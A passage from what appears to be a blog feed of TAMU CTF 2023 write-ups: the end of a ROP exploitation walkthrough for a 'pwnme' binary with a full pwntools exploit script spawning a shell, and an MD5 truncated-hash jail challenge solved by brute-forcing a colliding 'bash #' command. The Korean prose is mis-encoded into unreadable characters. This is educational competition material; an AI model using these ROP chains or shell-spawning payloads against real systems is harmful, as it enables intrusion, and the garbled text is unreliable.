BYREF</span></span><br><span class="line"></span><br><span class="line">  setup();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;pwn me&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x48</span>uLL);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">win</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;/bin/bash&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Ï†ïÎßê Ìï† Í≤ÉÏù¥ ÏïÑÎ¨¥Í≤ÉÎèÑ ÏïàÎ≥¥Ïù¥Í≥† ÏΩîÎìúÍ∞Ä Í∞ÑÎã®Ìï¥ÏÑú Î≠ê Ìï†ÏßÄ ÌïúÏ∞∏ÏùÑ Í≥†ÎØºÌñàÎã§. Ïù¥Îü¥ Îïê Í∞ÄÏ†ØÏùÑ ÌïúÎ≤à Î¥êÏïºÌïúÎã§. Í∑∏Î¶¨Í≥† <code>pwnme</code> Ìï®ÏàòÏóêÏÑú <code>read</code> Ìï®ÏàòÎ•º Ïã§ÌñâÌï† Îïå Î†àÏßÄÏä§ÌÑ∞ ÏÉÅÌô©ÎèÑ Î¥êÏ£ºÎäî Í≤ÉÏù¥ Ï¢ãÎã§. overflowÍ∞Ä ÏÉùÍ∞ÅÎ≥¥Îã§ ÌÅ¨Í≤å ÏïàÎÇòÍ∏∞ ÎïåÎ¨∏Ïóê Î†àÏßÄÏä§ÌÑ∞ Í∞íÏùÑ Íµ≥Ïù¥ ÏïàÎ∞îÍæ∏Ïñ¥Ï§òÎèÑ ÎêòÎäî Í≤ÉÏùÄ ÏïàÎ∞îÍæ∏Ïñ¥Ï£ºÍ∏∞ ÏúÑÌï¥ÏÑúÏù¥Îã§.</p><ul><li>Î†àÏßÄÏä§ÌÑ∞ ÏÉÅÌô©</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$rax</span>   : 0x48              </span><br><span class="line"><span class="variable">$rbx</span>   : 0x007fff6312c768  ‚Üí  0x007fff6312d9b8  ‚Üí  0x656d6e77702f2e (<span class="string">&quot;./pwnme&quot;</span>?)</span><br><span class="line"><span class="variable">$rcx</span>   : 0x007feb21b1f931  ‚Üí  0x5777fffff0003d48 (<span class="string">&quot;H=&quot;</span>?)</span><br><span class="line"><span class="variable">$rdx</span>   : 0x48              </span><br><span class="line"><span class="variable">$rsp</span>   : 0x007fff6312c630  ‚Üí  0x00000000401185  ‚Üí  &lt;__libc_csu_init+85&gt; pop rsp</span><br><span class="line"><span class="variable">$rbp</span>   : 0x6161616161616161 (<span class="string">&quot;aaaaaaaa&quot;</span>?)</span><br><span class="line"><span class="variable">$rsi</span>   : 0x007fff6312c618  ‚Üí  0x6161616161616161 (<span class="string">&quot;aaaaaaaa&quot;</span>?)</span><br><span class="line"><span class="variable">$rdi</span>   : 0x0               </span><br><span class="line"><span class="variable">$rip</span>   : 0x007feb21c2e1fd  ‚Üí  &lt;pwnme+54&gt; ret </span><br><span class="line"><span class="variable">$r8</span>    : 0x00000000401190  ‚Üí  &lt;__libc_csu_fini+0&gt; ret </span><br><span class="line"><span class="variable">$r9</span>    : 0x007feb21c38d70  ‚Üí   endbr64 </span><br><span class="line"><span class="variable">$r10</span>   : 0x007feb21a34bd0  ‚Üí  0x000f001200001a3f</span><br><span class="line"><span class="variable">$r11</span>   : 0x246             </span><br><span class="line"><span class="variable">$r12</span>   : 0x0               </span><br><span class="line"><span class="variable">$r13</span>   : 0x007fff6312c778  ‚Üí  0x007fff6312d9c0  ‚Üí  <span class="string">&quot;SHELL=/bin/bash&quot;</span></span><br><span class="line"><span class="variable">$r14</span>   : 0x0               </span><br><span class="line"><span class="variable">$r15</span>   : 0x007feb21c67000  ‚Üí  0x007feb21c682c0  ‚Üí  0x0000000000000000</span><br><span class="line"><span class="variable">$eflags</span>: [zero CARRY PARITY adjust sign <span class="built_in">trap</span> INTERRUPT direction overflow resume virtualx86 identification]</span><br><span class="line"><span class="variable">$cs</span>: 0x33 <span class="variable">$ss</span>: 0x2b <span class="variable">$ds</span>: 0x00 <span class="variable">$es</span>: 0x00 <span class="variable">$fs</span>: 0x00 <span class="variable">$gs</span>: 0x00 </span><br></pre></td></tr></table></figure><ul><li>Ïì∏ÎßåÌï¥ Î≥¥Ïù¥Îäî Í∞ÄÏ†ØÎì§</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">0x0000000000401184: pop r12; pop r13; pop r14; pop r15; ret; </span><br><span class="line">0x0000000000401186: pop r13; pop r14; pop r15; ret; </span><br><span class="line">0x0000000000401188: pop r14; pop r15; ret; </span><br><span class="line">0x000000000040118a: pop r15; ret; </span><br><span class="line">0x0000000000401183: pop rbp; pop r12; pop r13; pop r14; pop r15; ret; </span><br><span class="line">0x0000000000401187: pop rbp; pop r14; pop r15; ret; </span><br><span class="line">0x0000000000401109: pop rbp; ret; </span><br><span class="line">0x000000000040118b: pop rdi; ret; </span><br><span class="line">0x0000000000401189: pop rsi; pop r15; ret; </span><br><span class="line">0x0000000000401185: pop rsp; pop r13; pop r14; pop r15; ret; </span><br><span class="line">0x0000000000401010: call rax; </span><br><span class="line">0x0000000000401191: mov rax, qword ptr [rdi]; ret; </span><br><span class="line">0x0000000000401192: mov eax, dwocrd ptr [rdi]; ret; </span><br><span class="line">0x00000000004011b2: sub rax, rsi; ret; </span><br></pre></td></tr></table></figure><h2 id="Worng-Idea"><a href="#Worng-Idea" class="headerlink" title="Worng Idea"></a>Worng Idea</h2><p>Ï≤òÏùåÏóê Î≠îÍ∞Ä ÏàòÏÉÅÌïú Í∞ÄÏ†ØÎì§ Î≥¥Í≥† ÏïÑÎûòÏôÄ Í∞ôÏù¥ Ïã§ÌñâÏãúÌÇ§Í≤†Îã§Îäî Í∞ÄÏÑ§ÏùÑ ÏÑ∏Ïõ†Îã§. <code>pwnme@got</code>ÏôÄ <code>win</code> Ìï®ÏàòÏùò Ïò§ÌîÑÏÖãÏùÑ Íµ¨Ìï¥ÏÑú <code>libc leak</code> ÏóÜÏù¥ ÎùºÏù¥Î∏åÎü¨Î¶¨ Ìï®ÏàòÎ•º Ïã§ÌñâÏãúÌÇ¨ Í≤ÉÏù¥Îã§.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">// 0x000000000040118b: pop rdi; ret; </span><br><span class="line">rdi = pwnme.got</span><br><span class="line">// mov rax, qword ptr [rdi]; ret; </span><br><span class="line">rax = &amp;pwnme</span><br><span class="line">// 0x0000000000401189: pop rsi; pop r15; ret; </span><br><span class="line">rsi = X</span><br><span class="line">// 0x00000000004011b2: sub rax, rsi; ret; </span><br><span class="line">rax = &amp;pwnme - X</span><br><span class="line">// 0x0000000000401010: call rax; </span><br><span class="line">rip = &amp;pwnme - X (win)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x18</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(e.got[<span class="string">&#x27;pwnme&#x27;</span>])</span><br><span class="line">payload += p64(mov_rax_rdi) <span class="comment"># raxÏóê Î¶ΩÏãú Ï£ºÏÜåÍ∞Ä Îì§Ïñ¥Í∞ëÎãàÎã§</span></span><br><span class="line">payload += p64(pop_rsi_r15)</span><br><span class="line">payload += p64(<span class="number">0x18</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(sub_rax_rsi)</span><br><span class="line">payload += p64(call_rax)</span><br></pre></td></tr></table></figure><p>ÌïòÏßÄÎßå Í∏∏Ïù¥Í∞Ä 0x10 Ïò§Î≤ÑÎÇòÏÑú ÏÇ¨Ïö©ÌïòÏßÄ Î™ªÌñàÎã§. Ïù¥ ÏïÑÏù¥ÎîîÏñ¥Î°ú Í∏∏Ïù¥Î•º Ï§ÑÏó¨Î≥¥Î†§Îã§Í∞Ä Ïûò ÏïàÎêòÏñ¥ÏÑú Îã§Î•∏ ÏïÑÏù¥ÎîîÏñ¥Î•º ÏÉùÍ∞ÅÌñàÎã§.</p><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><p>rspÎ•º ÏúÑÎ°ú Í≥ÑÏÜç Ïò¨Î†§ÏÑú Ïä§ÌÉù Í≥µÍ∞ÑÏùÑ ÎßàÎ†®ÌïòÏûêÎäî ÏÉùÍ∞ÅÏùÑ ÌñàÎã§.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000401199                 sub     rsp, 18h</span><br></pre></td></tr></table></figure><p>Ïä§ÌÉù Í≥µÍ∞ÑÏùÑ ÎßàÎ†®Ìï¥ÏÑú Ï≤´Î≤àÏß∏ ÏÉùÍ∞ÅÌïú ÏïÑÏù¥ÎîîÏñ¥Ïùò payloadÎ•º ÎÑ£Ïñ¥ÏÑú <code>ret</code> Í∞ÄÏ†ØÏúºÎ°ú Ïã§ÌñâÏãúÌÇ§Îäî Í≤ÉÏùÑ Î™©ÌëúÎ°ú ÌñàÎã§.</p><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;tamuctf.com&quot;</span>, <span class="number">443</span>, ssl=<span class="literal">True</span>, sni=<span class="string">&quot;pwnme&quot;</span>)</span><br><span class="line"><span class="comment"># p = process(&#x27;./pwnme&#x27;)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./pwnme&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libpwnme.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x40118b</span></span><br><span class="line">mov_rax_rdi = <span class="number">0x401191</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x401189</span></span><br><span class="line">sub_rax_rsi = <span class="number">0x4011b2</span></span><br><span class="line">call_rax = <span class="number">0x401010</span></span><br><span class="line">sub_rsp_0x18 = <span class="number">0x401199</span></span><br><span class="line">ret = pop_rdi + <span class="number">1</span></span><br><span class="line">pop1 = <span class="number">0x40118a</span></span><br><span class="line"></span><br><span class="line">rop_payload1 = p64(ret)</span><br><span class="line">rop_payload1 += p64(pop_rdi)</span><br><span class="line">rop_payload1 += p64(e.got[<span class="string">&#x27;pwnme&#x27;</span>])</span><br><span class="line"></span><br><span class="line">rop_payload2 = p64(mov_rax_rdi)</span><br><span class="line">rop_payload2 += p64(pop_rsi_r15)</span><br><span class="line">rop_payload2 += p64(<span class="number">0x18</span>)</span><br><span class="line"></span><br><span class="line">rop_payload3 = p64(<span class="number">0</span>)</span><br><span class="line">rop_payload3 += p64(sub_rax_rsi)</span><br><span class="line">rop_payload3 += p64(call_rax)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">spill</span>(<span class="params">values</span>):</span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span></span><br><span class="line">    payload += p64(sub_rsp_0x18)</span><br><span class="line">    payload += <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x10</span></span><br><span class="line">    payload += values</span><br><span class="line">    pause() <span class="comment"># picture</span></span><br><span class="line">    p.send(payload)</span><br><span class="line"></span><br><span class="line">spill(rop_payload3)</span><br><span class="line">spill(rop_payload2)</span><br><span class="line">spill(rop_payload1)</span><br><span class="line"></span><br><span class="line">payload = p64(ret)*<span class="number">7</span></span><br><span class="line">payload += p64(pop1)</span><br><span class="line">pause()</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><code>spill</code> Ìï®ÏàòÏóêÏÑú payloadÏóê <code>a*0x10</code>ÏùÑ Ï∂îÍ∞ÄÌï¥Ï§Ä Ïù¥Ïú†Í∞Ä <code>pwnme</code> Ìï®ÏàòÏóêÏÑú <code>sub     rsp, 10h</code> Ïù∏Ïä§Ìä∏Îü≠ÏÖòÏùÑ ÏàòÌñâÌïòÍ∏∞ ÎïåÎ¨∏Ïóê ÎÑ£Ïñ¥Ï§¨Îã§. payloadÎ•º ÏàúÏÑúÎåÄÎ°ú Í≤πÏπòÎäî Í≤É ÏóÜÏù¥ Ï†ïÎ†¨ÏãúÏºúÏ§òÏïºÌïòÍ∏∞ ÎïåÎ¨∏Ïù¥Îã§.<br><code>pop1</code>ÏùÑ Ìïú Ïù¥Ïú†Îäî Ï†Ä Ïä§ÌÉù ÏÉÅÌô©ÏóêÏÑú Î≥¥Ïù¥ÎäîÍ≤å <code>0x4141414141414141</code>ÏòÄÍ∏∞ ÎïåÎ¨∏Ïóê ÌïòÎÇò ÎπºÏ£ºÍ≥† <code>rsp</code>Î•º ÎÇ¥Î†§Ï§¨Îã§.</p><p>ÏïÑÎûòÎäî <code>spill</code> Ìï®ÏàòÏóêÏÑú <code>pause()</code>Î•º Ïù¥Ïö©ÌïòÏó¨ <code>pwnme</code> Ìï®ÏàòÏùò <code>read</code>Ïóê ÏûÖÎ†•ÏùÑ Î≥¥ÎÇ∏ ÌõÑ <code>rsp</code>Î•º Ï∂úÎ†•Ìïú ÏÉÅÌô©Ïù¥Îã§. <code>rop_payload1</code>Î•º Î≥¥ÎÇº Îïå Ï∫°Ï≥êÌñàÎã§.</p><img src="/images/230503-tamu2023-8.Pwnme-pwn/Screenshot 2023-05-03 at 20.05.44.png" width=700/><br><ul><li>Îπ®Í∞ÑÏÉâ: <code>pwnme</code> Ìï®ÏàòÏóêÏÑú <code>sub     rsp, 10h</code>Ïù∏Ïä§Ìä∏Îü≠ÏÖòÏùÑ ÏàòÌñâÌïòÏó¨ <code>rsp</code>Í∞Ä Îçî ÎÜíÏïÑÏ°åÎã§.</li><li>ÎÖ∏ÎûÄÏÉâ: <code>read</code> Ìï®ÏàòÏóêÏÑúÏùò <code>buf</code> ÏõêÎûò ÏÇ¨Ïù¥Ï¶à + <code>rbp</code></li><li>ÌååÎûÄÏÉâ: payloadÎ•º Ï†ÅÍ∏∞ ÏúÑÌï¥ Ïä§ÌÉù Í≥µÍ∞ÑÏùÑ ÎÑìÌûàÍ∏∞ ÏúÑÌï¥ <code>sub     rsp, 18h</code>ÏùÑ ÏàòÌñâÌï¥Ïïº ÌïúÎã§.</li><li>Ïó∞ÎëêÏÉâ: <code>rop_payload</code>Í∞Ä Ï†úÎåÄÎ°ú Ïù¥Ïñ¥ÏßÄÍ∏∞ ÏúÑÌï¥ offsetÏùÑ ÎßûÏ∂∞Ï£ºÍ∏∞ ÏúÑÌïú dummyÏù¥Îã§.</li><li>Ï£ºÌô©ÏÉâ: Ïä§ÌÉù Í≥µÍ∞ÑÏù¥ ÎÑìÏñ¥Ï°åÍ≥†, ÎÇòÎ®∏ÏßÄ <code>rop_payload</code>Î•º Ïç®ÏïºÌïòÎäî Í≥µÍ∞ÑÏù¥Îã§. Îí§ÏóêÎèÑ <code>rop_payload</code>Í∞Ä Ï†ÅÌòÄÏûàÎäîÎç∞ Ïù¥Í≤ÉÍ≥º Ïù¥Ïñ¥Ï†∏ÏÑú Ïç®Ï§òÏïº ÌïúÎã§. Í∑∏ÎûòÏÑú Ïó∞ÎëêÏÉâÏù¥ Ïù¥ Ïù¥Ïñ¥ÏßÄÍ∏∞ ÏúÑÌïú offsetÏùÑ ÎßûÏ∂îÍ∏∞ ÏúÑÌïú dummyÍ∞Ä Îì§Ïñ¥Í∞ÄÏïº ÌïúÎã§.</li></ul><p>Ïä§ÌÉùÏóê <code>rop_payload</code>Î•º Îã§ Ï†ÅÏñ¥Ï£ºÍ≥† <code>ret</code>Î•º Ïó¨Îü¨Î≤à Ïã§ÌñâÏãúÏºúÏÑú <code>rsp</code>Î•º <code>rop_payload</code> ÏûàÎäî Í≥≥ÍπåÏßÄ ÎÇ¥Î†§ÏÑú Ïã§ÌñâÏãúÌÇ§Î©¥ ÎÅùÏù¥Îã§.</p><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gigem&#123;r0p_g4dg3ts_r_c00l&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Tamu </category>
          
      </categories>
      
      
        <tags>
            
            <tag> rsp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tamu CTF 2023 - MD5 (crypto, md5 collision)</title>
      <link href="/230503-tamu2023-9.MD5-crypto/"/>
      <url>/230503-tamu2023-9.MD5-crypto/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1914">https://ctftime.org/event/1914</a></li></ul><blockquote><p>MD5 jail?!?!?!?!<br>Author: anomie</p></blockquote><ul><li>[114 solves &#x2F; 373 points]</li></ul><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">md5sum</span>(<span class="params">b: <span class="built_in">bytes</span></span>):</span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(b).digest()[:<span class="number">3</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">whitelisted_cmd = <span class="string">b&#x27;echo lmao&#x27;</span></span><br><span class="line">whitelisted_hash = md5sum(whitelisted_cmd) </span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">repr</span>(whitelisted_hash))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">repr</span>(<span class="built_in">hex</span>(u32(whitelisted_hash.ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>)))))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        cmd = <span class="built_in">input</span>(<span class="string">&#x27;&gt; &#x27;</span>).encode()</span><br><span class="line">        <span class="keyword">if</span> cmd == <span class="string">b&#x27;exit&#x27;</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;Goodbye&#x27;</span>)</span><br><span class="line">            exit()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> md5sum(cmd) != whitelisted_hash:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;Invalid command, try &quot;<span class="subst">&#123;whitelisted_cmd.decode()&#125;</span>&quot;&#x27;</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            out = subprocess.check_output([<span class="string">&#x27;/bin/bash&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>, cmd])</span><br><span class="line">            <span class="built_in">print</span>(out.decode())</span><br><span class="line">        <span class="keyword">except</span> subprocess.CalledProcessError <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;Command returned non-zero exit status <span class="subst">&#123;e.returncode&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>Î¨∏Ï†ú Ïä§ÌÅ¨Î¶ΩÌä∏ÏóêÏÑú <code>md5sum</code> Ìï®ÏàòÎ•º ÏÇ¥Ìé¥Î≥¥Î©¥ 3Î∞îÏù¥Ìä∏Îßå Î¶¨ÌÑ¥ÌïúÎã§. </p><p>Î¨∏Ï†ú ÌíÄÏù¥Ïóê ÏïûÏÑú <code>md5 collision</code>Ïóê ÎåÄÌï¥ Í∞ÑÎã®Ìûà ÏÇ¥Ìé¥Î¥§Îã§. <code>md5</code>Îäî Í∞ôÏùÄ ÏûÖÎ†•Í∞íÏù¥Î©¥ Ìï≠ÏÉÅ Í∞ôÏùÄ Ï∂úÎ†•Í∞íÏù¥ ÎÇòÏò®Îã§. ÏÑúÎ°ú Îã§Î•∏ Í∞íÏùÑ ÏûÖÎ†•Ìï† Í≤ΩÏö∞ Í∞ôÏùÄ Ï∂úÎ†•Í∞íÏù¥ ÎÇòÏò¨ ÌôïÎ•†ÏùÄ ÍµâÏû•Ìûà ÎÇÆÏßÄÎßå Í∞ôÏùÄ Í∞íÏù¥ ÎÇòÏò¨ Í∞ÄÎä•ÏÑ±Ïù¥ Ï°¥Ïû¨ÌïúÎã§. ÏòàÎ•º Îì§Î©¥ <code>AAAA</code>ÏôÄ <code>BBBB</code>Ïùò <code>md5</code>Î•º Ï†ÅÏö©ÌñàÏùÑ Îïå Ï∂úÎ†•Í∞íÏù¥ Í∞ôÏùÑ ÏàòÎèÑ ÏûàÎã§Îäî ÏùòÎØ∏Ïù¥Îã§. Ïù¥Îü∞ ÏÉÅÌô©ÏùÑ <code>md5 collision</code>Ïù¥ÎùºÍ≥† ÌïúÎã§. </p><p>Î¨∏Ï†ú Ïä§ÌÅ¨Î¶ΩÌä∏Îäî ‚Äòecho lmao‚ÄôÎ•º <code>md5sum</code> Ìï®ÏàòÎ•º Í±∞Ïπú ÌõÑÏùò Í∞íÍ≥º Í∞ôÏúºÎ©¥ ÏûÖÎ†•Í∞íÏùÑ <code>bash</code>Î°ú Ïã§ÌñâÌï† Ïàò ÏûàÎã§. ÎßâÎßâÌï¥Î≥¥Ïù¥ÏßÄÎßå ÏÇ¨Ïã§ <code>md5sum</code> Ìï®ÏàòÏóêÏÑúÏùò Ï†ÑÏ≤¥ Ìï¥ÏãúÍ∞íÏùò 3Î∞îÏù¥Ìä∏Îßå ÎòëÍ∞ôÏùÄ ÏûÖÎ†•Í∞íÏùÑ Ï∞æÏúºÎ©¥ ÎêúÎã§.</p><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><p>ÎÇòÎäî ÏâòÏùÑ ÌöçÎìùÌïòÍ∏∞ ÏúÑÌï¥ <code>bash #</code>ÏùÑ Í≥†Ï†ïÏúºÎ°ú ÎëêÍ≥† <code>#</code> Ï£ºÏÑù Îí§Ïóê Ïà´ÏûêÎ•º Ï†ÅÏñ¥Ï§òÏÑú Î∏åÎ£®Ìä∏Ìè¨Ïã±ÏúºÎ°ú <code>md5</code> Ìï¥ÏãúÍ∞Ä 3Î∞îÏù¥Ìä∏Îßå ÎòëÍ∞ôÏùÄ Í≤ΩÏö∞Î•º Ï∞æÏúºÎ†§Í≥† ÌñàÍ≥†, ÏÑ±Í≥µÌñàÎã§!</p><h3 id="Solve-Code"><a href="#Solve-Code" class="headerlink" title="Solve Code"></a>Solve Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># from pwn import *</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = remote(&quot;tamuctf.com&quot;, 443, ssl=True, sni=&quot;md5&quot;)</span></span><br><span class="line"><span class="comment"># p.sendlineafter(&#x27;&gt;&#x27;,&#x27;bash # 2695494&#x27;)</span></span><br><span class="line"><span class="comment"># p.interactive()</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">md5sum</span>(<span class="params">b: <span class="built_in">bytes</span></span>):</span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(b).digest()[:<span class="number">3</span>]</span><br><span class="line"></span><br><span class="line">whitelisted_cmd = <span class="string">b&#x27;echo lmao&#x27;</span></span><br><span class="line">whitelisted_hash = md5sum(whitelisted_cmd)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x1000000000</span>):</span><br><span class="line">    input_cmd = <span class="string">b&#x27;bash # &#x27;</span> + <span class="built_in">str</span>(i).encode()</span><br><span class="line">    input_hash = md5sum(input_cmd)</span><br><span class="line">    <span class="comment"># print(repr(hex(u32(input_hash.ljust(4, b&#x27;\x00&#x27;)))))</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> input_hash != whitelisted_hash:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;###############################################&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(input_cmd)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># $ cat flag.txt &gt;&amp;2</span></span><br></pre></td></tr></table></figure><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gigem&#123;3_bYt3_MD5_1s_Ju5t_pr00f_0f_W0rK&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Tamu </category>
          
      </categories>
      
      
        <tags>
            
            <tag> crypto </tag>
            
            <tag> md5 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tamu CTF 2023 - Sea Shells (pwn, shellcode)</title>
      <link href="/230503-tamu2023-5.Sea_Shells-pwn/"/>
      <url>/230503-tamu2023-5.Sea_Shells-pwn/</url>
      
